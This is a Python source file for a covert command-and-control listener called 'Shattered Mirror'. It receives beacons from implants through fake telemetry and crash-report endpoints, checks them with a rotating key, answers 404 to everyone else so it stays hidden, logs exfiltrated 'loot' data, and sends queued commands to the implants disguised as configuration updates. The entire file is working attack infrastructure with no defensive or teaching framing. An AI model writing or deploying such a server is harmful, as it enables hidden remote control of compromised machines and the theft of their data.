import asyncio
import json
import logging
import argparse
from aiohttp import web
from psk_rotator import PSKRotator

# Setup Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global C2 State
# In a real backend, this maps to SQLite or Postgres
TARGET_SEED = b"SuperSecretSeedForClient001"
psk_tracker = PSKRotator(TARGET_SEED)
command_queue = []

async def handle_telemetry(request):
    """
    Handles incoming beacons disguised as telemetry.
    Expected Route: POST /api/v2/telemetry
    """
    auth_header = request.headers.get('X-Telemetry-ID')
    if not auth_header or not psk_tracker.validate_psk(auth_header):
        logging.warning(f"Unauthorized beacon attempt from {request.remote}")
        return web.Response(status=404) # Pretend this endpoint doesn't exist

    try:
        data = await request.json()
        report_id = data.get('report_id')
        blob = data.get('diagnostic_blob')
        
        logging.info(f"[BEACON] Valid connection. Report ID: {report_id}")
        
        if blob and blob != "dummy":
            # This is where we hand off to exfil_receiver.py logic
            logging.info(f"[LOOT] Received {len(blob)} bytes of b64 loot data.")

        # If we have commands queued, send them in the response mimicking a config update
        response_data = {"status": "success"}
        if command_queue:
            cmd = command_queue.pop(0)
            response_data["action_policy"] = cmd
            logging.info(f"Dispatched command to implant: {cmd}")

        return web.json_response(response_data)

    except json.JSONDecodeError:
        return web.Response(status=400)

async def init_app():
    app = web.Application()
    
    # We map several disguised routes to the same handler to rotate appearances
    app.router.add_post('/api/v2/telemetry', handle_telemetry)
    app.router.add_post('/api/v2/crash_report', handle_telemetry)
    app.router.add_post('/v1/events/log', handle_telemetry)
    
    return app

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Shattered Mirror C2 Listener")
    parser.add_argument("--port", type=int, default=8080, help="Port to listen on (default: 8080)")
    args = parser.parse_args()

    logging.info(f"Starting Shattered Mirror Listener on Port {args.port}")
    logging.info("Listening for incoming beacons disguised as telemetry...")
    # Run locally on specified port. NGINX will proxy 443 -> specified port.
    web.run_app(init_app(), host='0.0.0.0', port=args.port)
